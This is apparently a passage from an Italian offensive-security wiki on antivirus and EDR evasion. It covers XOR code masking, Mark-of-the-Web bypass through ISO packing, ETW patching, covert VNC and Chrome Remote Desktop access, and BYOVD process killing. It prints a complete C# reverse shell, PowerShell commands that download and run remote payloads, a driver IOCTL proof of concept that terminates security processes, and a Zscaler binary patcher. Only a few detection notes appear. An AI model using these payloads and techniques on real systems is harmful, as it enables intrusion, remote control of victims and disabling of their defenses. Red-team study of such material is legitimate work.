#### Trasformazione del control flow nel backend

Questa operazione deve essere eseguita dopo la selezione delle istruzioni e l'ottimizzazione, perché la trasformazione deve coprire **ogni** return emesso e conoscere l'esatto layout x86. Un `MachineFunctionPass` eseguito prima dell'emissione individua l'ultimo `MachineInstr::isReturn()`, lo elimina in modo che il percorso finale prosegua nell'epilogo aggiunto e sostituisce i return precedenti con `JMP_1 handler`. Mantieni qualsiasi teardown dello stack/frame generato dal compilatore prima di ogni return; reindirizza solo l'istruzione di return.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` e `X86AsmPrinter::emitFunctionBodyEnd()` emettono gli stub per funzione, mentre `emitEndOfAsmFile()` emette l'handler. I simboli condivisi tra le fasi di emissione consentono a un branch del prologo di puntare al suo epilogo successivo; per un `je` near emesso manualmente, scrivi `0F 84` seguito dall'espressione MC a quattro byte `target - address_after_je`. Le call e i jump verso l'handler possono invece essere emessi come oggetti `MCInst` (`CALL64pcrel32` e `JMP_1`). Un pass deve restituire `false` per una funzione non selezionata quando non ha modificato nulla; il PoC restituisce erroneamente `true` in questo caso.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadata e inizializzazione pre-CRT

Il PoC inserisce una chiave XOR e record da 16 byte contenenti un function pointer rilocato dal loader e una lunghezza runtime in `.funcmeta`. Sebbene il campo C sia un `uint32_t`, l'handler accede a un QWORD all'offset `+8` del record, consumando la lunghezza e il relativo padding, e avanza tra i record di `0x10`. I nomi delle sezioni PE occupano solo otto byte, quindi la ricerca runtime vede `.funcmet`. Un patcher esterno aggiunge una sezione eseguibile `.stub`, salva nello stub l'RVA dell'entry point originale e reindirizza `AddressOfEntryPoint`; lo stub PIC ottiene la image base da `gs:[0x60]` → `[PEB+0x10]`, percorre gli import PE32+ per risolvere una `VirtualProtect` già importata ed esegue prima del CRT.<sup>[[38]](#references)[[39]](#references)</sup>

L'inizializzazione imposta un sentinel in `gs:[0xE8]` e chiama ogni funzione indicata nei metadata. Il suo prologo permanentemente leggibile registra l'inizio della funzione in `gs:[0xF0]`, rileva il sentinel e salta il body ancora non mascherato. L'epilogo usa quindi `call handler`; dopo che l'handler ha salvato 13 registri (`0x68` byte), l'indirizzo di ritorno in `[rsp+0x68]` corrisponde alla fine della funzione trasformata, quindi `end - start` può essere scritto nel relativo record metadata. Lo stub cancella il sentinel e salta a `ImageBase + original_entry_point_RVA` dopo che tutti i body sono stati mascherati.<sup>[[38]](#references)[[39]](#references)</sup>

Durante una call normale, il prologo chiama lo stesso handler simmetrico per decodificare il body. Il percorso finale confluisce nell'epilogo aggiunto, mentre ogni return precedente salta direttamente all'handler condiviso. Anche l'epilogo normale usa `jmp handler` invece di `call`, così, dopo la nuova mascheratura, il `ret` dell'handler consuma l'indirizzo di ritorno del caller originale e preserva il risultato della funzione in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Primitiva di masking e indicatori di analisi

L'handler individua il record corrente, salta il prologo visibile fisso (`0x46` byte in questa build), modifica il resto in `PAGE_EXECUTE_READWRITE`, applica XOR byte per byte usando il byte basso della chiave e lo reimposta a `PAGE_EXECUTE_READ`. Lo stesso loop decodifica quindi all'ingresso e codifica a ogni uscita normale.<sup>[[38]](#references)[[39]](#references)</sup>

Gli indicatori ad alto segnale di questo design includono:<sup>[[38]](#references)[[39]](#references)</sup>

- un entry point all'interno di uno `.stub` eseguibile e una sezione `.funcmet` contenente una chiave più puntatori `.text` rilocati;
- parsing pre-CRT del PEB, della import table e della section table, seguito da call tramite ogni puntatore dei metadata;
- prologhi PIC `call`/`pop` identici e numerosi return reindirizzati a un unico handler;
- scritture in `gs:[0xE8]`, `gs:[0xF0]` e `gs:[0xF8]` seguite da transizioni ripetute di `VirtualProtect` e scritture XOR byte per byte in pagine eseguibili supportate dall'immagine.

Si tratta di evasione degli memory scanner, non di protezione crittografica: il file patchato contiene ancora il body originale in chiaro e un debugger può interrompersi su `VirtualProtect` o sul loop XOR e fare il dump della funzione attiva. Anche l'XOR a singolo byte, i metadata leggibili e il limite fisso `0x46` rendono semplice il recupero offline.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Gli slot TEB del PoC sono thread-local, ma le pagine di codice modificate sono condivise a livello di processo. Un ingresso concorrente o ricorsivo può quindi riapplicare il toggle delle istruzioni mentre un'altra invocazione è in esecuzione; anche le eccezioni e le uscite non locali possono evitare la nuova mascheratura. Un'implementazione robusta deve sincronizzare le transizioni, ripristinare la protezione effettivamente restituita tramite `lpflOldProtect`, evitare lunghezze dello stub hard-coded, verificare entrambi i percorsi `call` e `jmp` per l'allineamento dello stack x64 e chiamare `FlushInstructionCache` dopo aver riscritto i byte eseguibili. Microsoft attribuisce esplicitamente al caller la responsabilità della coerenza della instruction cache quando viene modificato codice eseguibile.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen e MoTW

Potresti aver visualizzato questa schermata scaricando alcuni eseguibili da internet ed eseguendoli.

Microsoft Defender SmartScreen è un meccanismo di sicurezza progettato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente malevole.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen opera principalmente con un approccio basato sulla reputazione: ciò significa che le applicazioni scaricate raramente attiveranno SmartScreen, che avviserà l'utente finale e impedirà l'esecuzione del file (anche se il file può comunque essere eseguito facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) denominato Zone.Identifier, creato automaticamente quando si scaricano file da internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verifica dell'ADS Zone.Identifier per un file scaricato da internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un metodo molto efficace per impedire ai payload di ricevere il Mark of The Web consiste nel racchiuderli in un qualche tipo di container, come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che inserisce i payload in container di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando i payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Analogamente a come viene disabilitato (bypassato) AMSI, è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo user space restituisca immediatamente il controllo senza registrare alcun evento. Questo viene fatto applicando una patch alla funzione in memoria affinché restituisca immediatamente il controllo, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

Il caricamento di binari C# in memoria è noto da parecchio tempo ed è tuttora un ottimo modo per eseguire i tuoi strumenti di post-exploitation senza essere rilevati dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci soltanto di applicare una patch ad AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma esistono diversi modi per farlo:

- **Fork\&Run**

Consiste nello **spawnare un nuovo processo sacrificale**, iniettare il tuo codice malevolo di post-exploitation in quel nuovo processo, eseguire il codice malevolo e, al termine, terminare il nuovo processo. Questo presenta sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori del processo del nostro Beacon implant**. Ciò significa che, se qualcosa nella nostra attività di post-exploitation va storto o viene rilevato, c'è una **probabilità molto maggiore** che il nostro **implant sopravviva**. Lo svantaggio è che hai una **probabilità maggiore** di essere rilevato dalle **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo puoi evitare di dover creare un nuovo processo e sottoporlo alla scansione dell'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, c'è una **probabilità molto maggiore** di **perdere il tuo beacon**, poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere altro sul caricamento di C# Assembly, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare C# Assemblies **da PowerShell**; consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo utilizzando altri linguaggi, fornendo alla macchina compromessa accesso **all'ambiente dell'interpreter installato sulla condivisione SMB controllata dall'Attacker**.

Consentendo l'accesso ai Binaries dell'interpreter e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repository indica quanto segue: Defender esegue comunque la scansione degli script, ma utilizzando Go, Java, PHP ecc. abbiamo **maggiore flessibilità nel bypassare le static signatures**. I test con random reverse shell scripts non offuscati in questi linguaggi hanno dato risultati positivi.

## TokenStomping

Il token stomping manipola l'access token di un prodotto di sicurezza come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli al contempo di eseguire azioni privilegiate di ispezione o remediation.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**questo blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop sul PC di una vittima e utilizzarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scarica il software da https://remotedesktop.google.com/, fai clic su "Set up via SSH", quindi fai clic sul file MSI per Windows per scaricare il file MSI.
2. Esegui silenziosamente l'installer sulla macchina vittima (sono richiesti privilegi admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su next. La procedura guidata ti chiederà quindi di autorizzare; fai clic sul pulsante Authorize per continuare.
4. Esegui il comando fornito apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza utilizzare la GUI).


## Advanced Evasion

L'evasion è un argomento molto complesso; a volte devi tenere conto di molte fonti diverse di telemetria in un unico sistema, quindi è praticamente impossibile rimanere completamente non rilevati negli ambienti maturi.

Ogni ambiente contro cui operi avrà i propri punti di forza e le proprie debolezze.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per iniziare ad approfondire le tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi utilizzare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuoverà parti del binario** finché non **scoprirà quale parte Defender** considera malevola, mostrandotela.\
Un altro tool che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), con un servizio web disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutti i sistemi Windows includevano un **Telnet server** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema ed **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) **e disabilita il firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (ti servono i download bin, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Quindi, sposta il binary _**winvnc.exe**_ e il file **UltraVNC.ini** appena creato all'interno della **victim**

#### **Reverse connection**

L'**attacker** deve **eseguire all'interno del proprio** **host** il binary `vncviewer.exe -listen 5900`, così sarà **preparato** a ricevere una **VNC connection** reverse. Quindi, all'interno della **victim**: avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Per mantenere la stealth non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti attiverai un [popup](https://i.imgur.com/1SROTTl.png). Verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti verrà aperta [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per visualizzare l'help, altrimenti attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` ed **esegui** il **payload XML** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilazione della nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell in C#

Compilala con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscators C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio di utilizzo di Python per creare injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Terminare AV/EDR Dal Kernel Space

Storm-2603 ha sfruttato una piccola console utility nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire il ransomware. Lo strumento porta con sé il **proprio driver vulnerabile ma *firmato*** e ne abusa per eseguire operazioni privilegiate nel kernel che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.<sup>[[12]](#references)</sup>

Punti chiave
1. **Driver firmato**: il file distribuito sul disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` di “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver presenta una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia, rendendo così `\\.\ServiceMouse` accessibile dallo user land.
3. **IOCTL esposti dal driver**
| Codice IOCTL | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario tramite PID (usato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario dal disco |
| `0x990001D0` | Scaricare il driver e rimuovere il service |

Proof-of-concept C minimale:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD ignora completamente le protezioni user-mode; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere gli oggetti del kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la vulnerable-driver block list di Microsoft (`HVCI`, `Smart App Control`) affinché Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitorare la creazione di nuovi *kernel* service e generare alert quando un driver viene caricato da una directory scrivibile da tutti o non presente nell’allow-list.
•  Monitorare gli handle user-mode verso custom device objects seguiti da chiamate `DeviceIoControl` sospette.

### Bypassing dei Posture Check di Zscaler Client Connector tramite Patching di Binari On-Disk

**Client Connector** di Zscaler applica localmente le regole di device-posture e si basa su Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (al server viene inviato un booleano).
2. Gli endpoint RPC interni verificano soltanto che l’eseguibile connesso sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Tramite il **patching di quattro binari firmati sul disco**, entrambi i meccanismi possono essere neutralizzati:

| Binario | Logica originale sottoposta a patch | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi ogni check risulta compliant |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | Sostituita con NOP ⇒ qualsiasi processo, anche unsigned, può effettuare il bind alle RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity check sul tunnel | Bypassata |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i controlli di postura risultano **verdi/conformi**.
* I binari non firmati o modificati possono aprire gli endpoint RPC delle named pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso illimitato alla rete interna definita dalle policy Zscaler.

Questo case study dimostra come decisioni di trust prese esclusivamente lato client e semplici controlli delle firme possano essere aggirati con poche patch ai byte.

## Abuso delle funzionalità trusted di Microsoft Defender `BTR.sys`

Il driver **Boot-Time Removal** di Defender è un utile controesempio al classico BYOVD. `BTR.sys` è un componente legittimo di remediation firmato da Microsoft, privo di bug di memory corruption e di interfaccia IOCTL; dopo aver ottenuto l'accesso amministrativo e `SeLoadDriverPrivilege`, un operatore può invece falsificare la sua transazione privata di remediation e ottenere le operazioni Ring-0 previste su file/registro. Si tratta di una **primitiva di neutralizzazione di AV/EDR post-compromise, non di initial access o privilege escalation**, e il driver può essere estratto dalla risorsa `BOOTTIMETOOL` del file `MpEngine.dll` del target stesso, invece di importare un driver di terze parti facilmente individuabile.<sup>[[36]](#references)</sup>

### Preparazione del driver one-shot

Normalmente Defender deposita la risorsa come file `[a-z]{8}.sys` casuale e registra un kernel service con un nome analogo. `DriverEntry` legge il valore `Args` del servizio, apre l'NTFS ADS indicato, decritta e convalida l'elenco delle azioni, scrive il feedback e restituisce `0xC0000056` (`STATUS_DELETE_PENDING`) dopo l'esecuzione corretta, in modo che il driver venga scaricato invece di rimanere residente. Un servizio falsificato presenta i seguenti valori caratteristici.<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
Lo stream `:changelist` contiene un blob cifrato con RC4. Le build analizzate riutilizzano una chiave fissa di 256 byte, quindi la cifratura non costituisce un confine di autorizzazione. Un plaintext valido presenta un global header di 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC e un transaction ID derivato dal payload), seguito da un feedback path UTF-16 con terminazione null e da un numero qualsiasi di item. Ogni item include un header di 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) più dati specifici dell'action, terminati da **esattamente quattro byte NUL**. Ogni regione header/data viene verificata indipendentemente con il polinomio CRC-32 `0xEDB88320`, stato iniziale `0xFFFFFFFF` e **senza XOR finale** (`~CRC32`); lo stato CRC viene reimpostato per ogni regione.<sup>[[36]](#references)[[37]](#references)</sup>

Gli action ID accettati espongono queste primitive del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dati dell'item | Risultato |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eliminare un file, incluso un file bloccato |
| 2 | `[UTF-16 path]` | Rimuovere una directory vuota |
| 3 | `[Flags][source][destination]` | Spostare un file in un protected path scelto dall'attacker; una destination vuota significa eliminare |
| 4 | `[Flags][key path]` | Eliminare ricorsivamente una registry key |
| 5 | `[Flags][key path + "\\" + value]` | Eliminare un registry value |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Creare/aggiornare un registry value e creare i key path mancanti |

Per le action 5 e 6, il separatore key/value on-wire è costituito da **due backslash consecutivi**; un path formattato secondo le convenzioni non verrà suddiviso correttamente. Il feedback file rispecchia in gran parte la request, ma i primi quattro byte dei dati di ogni item diventano il relativo `NTSTATUS`. Per le action 1 e 2, che non hanno un campo flags iniziale, BTR sposta il path nei quattro byte finali riservati per fare spazio a quello status.<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow e finestra di early-boot

